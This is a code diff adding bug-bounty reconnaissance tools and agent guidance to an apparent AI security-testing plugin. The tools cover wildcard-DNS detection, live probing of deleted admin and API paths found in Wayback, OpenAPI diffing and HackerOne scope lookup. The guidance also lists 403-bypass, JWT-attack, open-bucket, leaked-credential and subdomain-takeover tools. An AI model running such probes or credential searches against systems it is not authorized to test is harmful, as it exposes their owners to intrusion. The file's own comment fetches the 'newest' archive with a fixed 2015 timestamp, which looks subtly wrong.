+						const ips = uniq((Array.isArray(j.Answer) ? j.Answer : []).filter((a) => a.type === 1 && typeof a.data === "string").map((a) => a.data));
+						out.labels.push({ label: lbl, ips, status: j.Status || 0 });
+						if (ips.length) ipSets.push(ips.slice().sort().join(","));
+					} catch {
+						out.labels.push({ label: lbl, ips: [], status: 0 });
+					}
+				});
+				const freq = {};
+				for (const s of ipSets) freq[s] = (freq[s] || 0) + 1;
+				const max = Math.max(0, ...Object.values(freq));
+				out.wildcard = max >= 2;
+				if (out.wildcard) out.note = "random labels resolve to the same IP set (" + Object.keys(freq).find((k) => freq[k] === max) + ") — subdomain brute-force/enumeration will show false positives; filter before probing.";
+				else if (!out.labels.some((l) => l.ips.length)) out.note = "no random label resolved — clean zone, or resolution blocked.";
+			} catch (e) {
+				out.error = shortErr(e);
+			}
+			return out;
+		}
+	},
+	{
+		name: "bb_resurrected_endpoints",
+		description: "Mine Wayback for deleted/forgotten endpoints and probe them live on the current app (status/size) — resurrected admin, API and backup paths often lack auth. ACTIVE probing: authorized targets only. Keyless: CDX + direct HTTP.",
+		parameters: {
+			type: "object",
+			additionalProperties: false,
+			properties: {
+				domain: { type: "string", description: "Domain to harvest, e.g. example.com" },
+				limit: { type: "integer", description: "Max archived URLs to probe (default 30)" }
+			},
+			required: ["domain"]
+		},
+		output: {
+			schema: {
+				type: "object",
+				properties: {
+					domain: { type: "string" },
+					harvested: { type: "integer" },
+					alive: { type: "array", items: { type: "object", properties: { url: { type: "string" }, status: { type: "integer" }, size: { type: "integer" } }, required: ["url", "status", "size"], additionalProperties: false } },
+					note: { type: "string" }
+				},
+				required: ["domain", "harvested", "alive", "note"],
+			},
+			render: (_args, v) =>
+				renderLines("🧟 bb_resurrected_endpoints", [
+					"domain: " + v.domain + " (" + v.harvested + " archived URLs)",
+					"resurrected (live now):",
+					...(v.alive.length ? v.alive.map((a) => "HTTP " + a.status + " " + a.size + "B " + a.url.slice(0, 120)) : ["none — all gone or filtered"]),
+					v.note ? "note: " + v.note : ""
+				].filter(Boolean))
+		},
+		timeoutMs: 90000,
+		isConcurrencySafe: () => true,
+		async execute(args, exec) {
+			const d = normalizeDomain(args.domain);
+			const out = { domain: d, harvested: 0, alive: [], note: "" };
+			try {
+				const cap = Math.min(parseInt(args.limit || 30, 10), 60);
+				const { urls, error } = await cdxUrls(d, exec, { cap: cap * 3 });
+				if (error) out.note = "wayback: " + error;
+				const interesting = urls.filter((u) => /(admin|api|backup|upload|console|internal|staging|dev|test|debug|swagger|graphql|\.sql|\.env|download|export|import|config|panel|wp-)/i.test(u)).slice(0, cap);
+				out.harvested = interesting.length;
+				await mapPool(interesting, 6, async (u) => {
+					try {
+						const { res } = await fetchRes(u, exec, { budget: 8000, redirect: "manual" });
+						const body = await readLimited(res, 400);
+						if (res.status >= 200 && res.status < 500 && res.status !== 404) out.alive.push({ url: u, status: res.status, size: body.length });
+					} catch {
+						// gone/blocked
+					}
+				});
+				out.alive.sort((a, b) => a.status - b.status);
+				if (!out.alive.length) out.note = "no resurrected endpoints; widen limit or check bb_wayback_urls for more paths.";
+			} catch (e) {
+				out.error = shortErr(e);
+			}
+			return out;
+		}
+	},
+	{
+		name: "bb_api_docs_diff",
+		description: "Diff the live OpenAPI/Swagger spec against the newest Wayback-archived snapshot: surface removed/shadow endpoints and newly exposed paths. Keyless: live + CDX + web.archive.org.",
+		parameters: {
+			type: "object",
+			additionalProperties: false,
+			properties: {
+				domain: { type: "string", description: "Domain, e.g. example.com" },
+				specPath: { type: "string", description: "Optional live spec path, e.g. /openapi.json (default probes common paths)" }
+			},
+			required: ["domain"]
+		},
+		output: {
+			schema: {
+				type: "object",
+				properties: {
+					domain: { type: "string" },
+					live: { type: "object", properties: { url: { type: "string" }, paths: { type: "array", items: { type: "string" } } }, required: ["url", "paths"], additionalProperties: false },
+					archived: { type: "object", properties: { url: { type: "string" }, paths: { type: "array", items: { type: "string" } } }, required: ["url", "paths"], additionalProperties: false },
+					added: { type: "array", items: { type: "string" } },
+					removed: { type: "array", items: { type: "string" } },
+					note: { type: "string" }
+				},
+				required: ["domain", "live", "archived", "added", "removed", "note"],
+			},
+			render: (_args, v) =>
+				renderLines("📐 bb_api_docs_diff", [
+					"domain: " + v.domain,
+					"live spec: " + (v.live.url ? v.live.url + " (" + v.live.paths.length + " paths)" : "none found"),
+					"archived spec: " + (v.archived.url ? v.archived.url + " (" + v.archived.paths.length + " paths)" : "none found"),
+					v.removed.length ? "REMOVED from live (shadow endpoints): " + v.removed.slice(0, 25).join(", ") : "",
+					v.added.length ? "ADDED since archive: " + v.added.slice(0, 25).join(", ") : "",
+					v.note ? "note: " + v.note : ""
+				].filter(Boolean))
+		},
+		timeoutMs: 60000,
+		isConcurrencySafe: () => true,
+		async execute(args, exec) {
+			const d = normalizeDomain(args.domain);
+			const empty = { url: "", paths: [] };
+			const out = { domain: d, live: { ...empty }, archived: { ...empty }, added: [], removed: [], note: "" };
+			const extract = (spec) => (spec && typeof spec === "object" && spec.paths && typeof spec.paths === "object" ? Object.keys(spec.paths) : []);
+			try {
+				const candidates = args.specPath ? [String(args.specPath)] : ["/openapi.json", "/swagger.json", "/swagger/v1/swagger.json", "/v2/api-docs", "/api-docs", "/api/openapi.json"];
+				for (const p of candidates) {
+					try {
+						const { res, text } = await fetchText("https://" + d + p, exec, { budget: 10000 });
+						if (res.status === 200 && /json/.test(res.headers.get("content-type") || "")) {
+							const spec = JSON.parse(text);
+							const paths = extract(spec);
+							if (paths.length) { out.live = { url: p, paths }; break; }
+						}
+					} catch {
+						// try next candidate
+					}
+				}
+				// newest archived spec-like URL
+				const { urls } = await cdxUrls(d, exec, { cap: 400 });
+				const specUrls = urls.filter((u) => /(openapi|swagger|api-docs|api\.json)/i.test(u)).slice(0, 3);
+				for (const u of specUrls) {
+					try {
+						const { text } = await fetchText("https://web.archive.org/web/2015id_/" + u, exec, { budget: 20000 });
+						const spec = JSON.parse(text);
+						const paths = extract(spec);
+						if (paths.length) { out.archived = { url: u, paths }; break; }
+					} catch {
+						// try next archived candidate
+					}
+				}
+				if (out.live.paths.length && out.archived.paths.length) {
+					const lset = new Set(out.live.paths), aset = new Set(out.archived.paths);
+					out.removed = out.archived.paths.filter((p) => !lset.has(p));
+					out.added = out.live.paths.filter((p) => !aset.has(p));
+					out.note = "diff is best-effort; spec coverage and versions vary — re-test removed paths on the live host before reporting.";
+				} else if (!out.live.paths.length && !out.archived.paths.length) {
+					out.note = "no spec found live or archived; try specPath, or mine bb_wayback_urls for openapi/swagger paths.";
+				} else {
+					out.note = "only one side has a spec — cannot diff. Archived spec moved/rotated?";
+				}
+			} catch (e) {
+				out.error = shortErr(e);
+			}
+			return out;
+		}
+	},
+	{
+		name: "bb_h1_intel",
+		description: "Best-effort HackerOne program intel: fetch a program's eligible scope JSON (policy_scopes/all_eligible/json) or fall back to the public programs index — for scope verification before testing. Keyless: public HackerOne JSON/HTML.",
+		parameters: {
+			type: "object",
+			additionalProperties: false,
+			properties: {
+				handle: { type: "string", description: "Program handle, e.g. security (bug bounty programs only show policy via their handle page)" },
+				limit: { type: "integer", description: "Max scopes (default 30)" }
+			},
+			required: []
+		},
+		output: {
+			schema: {
+				type: "object",
+				properties: {
+					handle: { type: "string" },
+					scopes: { type: "array", items: { type: "object", properties: { identifier: { type: "string" }, type: { type: "string" }, eligible: { type: "boolean" } }, required: ["identifier", "type", "eligible"], additionalProperties: false } },
+					fallback: { type: "boolean" },
+					note: { type: "string" }
+				},
+				required: ["handle", "scopes", "fallback", "note"],
+			},
+			render: (_args, v) =>
+				renderLines("🛡️ bb_h1_intel", [
+					"program: " + (v.handle || "(index)") + (v.fallback ? " [fallback: public programs index]" : ""),
+					"scopes: " + v.scopes.length,
+					...(v.scopes.slice(0, 30).map((s) => (s.eligible ? "" : "(not eligible) ") + "[" + s.type + "] " + s.identifier)),
+					v.note ? "note: " + v.note : ""
+				].filter(Boolean))
+		},
+		timeoutMs: 30000,
+		isConcurrencySafe: () => true,
+		async execute(args, exec) {
+			const handle = String(args.handle || "").trim();
+			const out = { handle, scopes: [], fallback: false, note: "" };
+			try {
+				if (handle) {
+					const { res, text } = await fetchText("https://hackerone.com/" + encodeURIComponent(handle) + "/policy_scopes/all_eligible/json", exec, { budget: 15000, headers: { accept: "application/json" } });
+					if (res.status === 200 && text.trim().startsWith("{")) {
+						let j;
+						try { j = JSON.parse(text); } catch { j = {}; }
+						const walk = (o) => {
+							if (Array.isArray(o)) { for (const x of o) walk(x); return; }
+							if (o && typeof o === "object") {
+								if (typeof o.asset_identifier === "string") out.scopes.push({ identifier: o.asset_identifier, type: String(o.asset_type || "?"), eligible: o.eligible_for_submission !== false });
+								for (const k of Object.keys(o)) walk(o[k]);
+							}
+						};
+						walk(j);
+						out.scopes = out.scopes.slice(0, Math.min(parseInt(args.limit || 30, 10), 100));
+						// dedupe
+						const seen = new Set();
+						out.scopes = out.scopes.filter((s) => (seen.has(s.identifier) ? false : (seen.add(s.identifier), true)));
+						if (!out.scopes.length) out.note = "policy JSON returned no scope objects; program may be invite-only or handle wrong.";
+					} else {
+						out.note = "no policy JSON (HTTP " + res.status + "); this program may be invite-only, so its scope page is not public.";
+					}
+				} else {
+					out.fallback = true;
+					const { text } = await fetchText("https://hackerone.com/programs/search?query=&sort_type=published_at", exec, { budget: 20000 });
+					const handles = uniq((text.match(/hackerone\.com\/([a-z0-9_-]+)(?:"|\/)/gi) || []).map((m) => m.replace(/^hackerone\.com\//i, "").replace(/["/]/g, "")).filter((h) => /^[a-zA-Z0-9][a-z0-9_-]{2,}$/.test(h))).slice(0, 40);
+					for (const h of handles.slice(0, 12)) out.scopes.push({ identifier: h, type: "program-handle", eligible: true });
+					out.note = "public index is HTML; extracted " + handles.length + " program handles — pass one to get its real scope JSON.";
+				}
+			} catch (e) {
+				out.error = shortErr(e);
+			}
+			return out;
+		}
+	}
 ];
 
 const GUIDANCE = [
@@ -4721,7 +5589,7 @@ const GUIDANCE = [
 	"- bb_tech_detect(url) — fingerprint the tech stack from headers, cookies and HTML (WordPress, Next.js, Nuxt, Drupal, Joomla, React, jQuery, nginx, IIS, Cloudflare, ...).",
 	"- bb_wayback_urls(domain, limit?) — archived URLs from the Wayback CDX API; flags interesting endpoints/params (id, file, redirect, token, auth, download, cmd, admin, api, .env, .git, swagger, graphql).",
 	"- bb_recon(domain) — one-shot pipeline: enum -> probe -> tech detect -> header audit; returns live hosts + findings (missing headers, leaks, cookie flags, http-only hosts).",
-	"- bb_checklist(category?) — web/API bug-bounty methodology checklist (75 categories: recon, IDOR/BAC, SSRF, auth, XSS, SQLi, business logic, API misconfig, subdomain takeover, CSRF/open redirect, file upload, engagement, reporting, registration-flows, actuator, js-recon, origin-ip, crlf-injection, host-header, rate-limit, 403-bypass, email-field, mass-assignment, punycode-idn, blind-xss, waf-bypass, framework-cves, github-recon, iis-fuzzing, nuclei-dast, s3-recon, swagger-api, wayback-mining, fuzz-pipeline, sqli-recon, open-redirect, cache-deception, wordpress, ct-monitor, url-collection, sensitive-data, lfi, cors, google-dorks, ssti-injection, xxe-injection, deserialization, jwt-attacks, graphql, http-smuggling, race-condition, nosql-injection, ldap-injection, oauth-sso, mfa-2fa-bypass, captcha-bypass, password-reset-flaw, session-management, source-leak, shadow-api, ntlm-info, grpc, websocket, dom-attacks, prototype-pollution, cache-poisoning, llm-ai, mobile-app, cloud-misconfig, k8s-docker, enterprise-platforms, cicd-supply-chain, web3-audit, offensive-osint). Unfiltered = compact index; pass a slug/name (e.g. \"ssrf\", \"api\") for full checks + techniques.",
+	"- bb_checklist(category?) — web/API bug-bounty methodology checklist (79 categories: recon, IDOR/BAC, SSRF, auth, XSS, SQLi, business logic, API misconfig, subdomain takeover, CSRF/open redirect, file upload, engagement, reporting, registration-flows, actuator, js-recon, origin-ip, crlf-injection, host-header, rate-limit, 403-bypass, email-field, mass-assignment, punycode-idn, blind-xss, waf-bypass, framework-cves, github-recon, iis-fuzzing, nuclei-dast, s3-recon, swagger-api, wayback-mining, fuzz-pipeline, sqli-recon, open-redirect, cache-deception, wordpress, ct-monitor, url-collection, sensitive-data, lfi, cors, google-dorks, ssti-injection, xxe-injection, deserialization, jwt-attacks, graphql, http-smuggling, race-condition, nosql-injection, ldap-injection, oauth-sso, mfa-2fa-bypass, captcha-bypass, password-reset-flaw, session-management, source-leak, shadow-api, ntlm-info, grpc, websocket, dom-attacks, prototype-pollution, cache-poisoning, llm-ai, mobile-app, cloud-misconfig, k8s-docker, enterprise-platforms, cicd-supply-chain, web3-audit, offensive-osint, leak-monitoring, bug-chaining, fuzzing-0day, timing-xsleaks). Unfiltered = compact index; pass a slug/name (e.g. \"ssrf\", \"api\") for full checks + techniques.",
 	"- bb_actuator_scan(url) — probe Spring Boot Actuator endpoints (/actuator/env, /heapdump, /jolokia, ...) for exposed internals, high-risk hits and default config.",
 	"- bb_js_secrets(domain, limit?) — mine archived JS bundles from the Wayback CDX API for leaked secrets (AWS keys, Google API keys, JWTs, generic key/secret pairs).",
 	"- bb_403_bypass(url) — try HTTP method flips, routing headers (X-Original-URL, X-Forwarded-For, X-Real-IP) and path mutations (/./, /%2e/, ;, %00, ..;/ etc) against a 403.",
@@ -4755,7 +5623,16 @@ const GUIDANCE = [
 	"- bb_source_audit(language?) — SEGREGATED source-code audit methodology (C/C++, Rust, Go, JS/TS): 7-step audit flow, bug-class priority order (parsers, memory mgmt, IPC/network, privilege boundaries, error handling, concurrency), per-language checks + grep patterns (memcpy, unsafe, unwrap, unsafe.Pointer, eval, __proto__, ...). Pass a language slug for focused output.",
 	"- bb_triage() — Rhat-scored bug triage workflow (bughunt obsidian bug-report template): score candidates with P(real_bug)/P(feasible)/P(reproducible)/P(new_root_cause)/expected_impact -> REPORT / INVESTIGATE / DISCARD; status tracking, finding classes (genuine vs design opinion vs style), SQLite concurrency audit checklist, report template fields.",
 	"Workflow: start a target with bb_recon(domain); drill into promising live hosts with bb_security_headers / bb_tech_detect / bb_probe_http; mine bb_wayback_urls for archived endpoints, IDs and params; use web_search for current techniques and bash for active PoCs. All sources are keyless and rate-limited — expect per-source errors and fall back gracefully. Triage every candidate with bb_triage BEFORE reporting (REPORT only high-Rhat: genuine + feasible + reproducible).",
-	"Engagement & ops (merged from bughunt rules): verify program scope BEFORE testing, never touch other users' data, report confirmed vulns within 24h. The shell is non-interactive: always use -y/--no-input flags, ssh -o BatchMode=yes, avoid vim/less/man/REPLs, pipe `yes` into anything that may prompt; prefer read/write/glob/grep tools over cat/find/grep."
+	"Engagement & ops (merged from bughunt rules): verify program scope BEFORE testing, never touch other users' data, report confirmed vulns within 24h. The shell is non-interactive: always use -y/--no-input flags, ssh -o BatchMode=yes, avoid vim/less/man/REPLs, pipe `yes` into anything that may prompt; prefer read/write/glob/grep tools over cat/find/grep.",
+	"- bb_jwt_analyze(token) — decode a JWT locally: flag alg:none, empty signature, kid/jku/x5u attack surface, exp, privilege/x-hasura claims. Pure local, authorized targets.",
+	"- bb_cloud_storage_scan(domain) — GET-only probes for open Azure Blob (?comp=list), GCP Storage (ListBucketResult) and Firebase (.json) on derived bucket names.",
+	"- bb_psbdmp_search(query) — keyless paste-dump search + content fetch for leaked creds; run against your own/authorized domains.",
+	"- bb_dockerhub_search(org) — Docker Hub API: org repos + latest tags (leaked images/secrets, abandoned orgs).",
+	"- bb_dangling_cname(domain) — crt.sh -> DoH CNAME -> NXDOMAIN; flag CNAMEs to takeover-able third-party services.",
+	"- bb_dns_wildcard_probe(domain) — random-label DoH A queries; matching IP sets = wildcard DNS (poisons subdomain enumeration).",
+	"- bb_resurrected_endpoints(domain) — wayback harvest -> live probe of deleted admin/api/backup paths; ACTIVE probing, authorized targets only.",
+	"- bb_api_docs_diff(domain) — diff live OpenAPI/Swagger vs newest archive: shadow/removed endpoints surface.",
+	"- bb_h1_intel(handle?) — best-effort HackerOne scope JSON / public programs index for scope verification."
 ].join("\n");
 
 export function apply(ctx) {
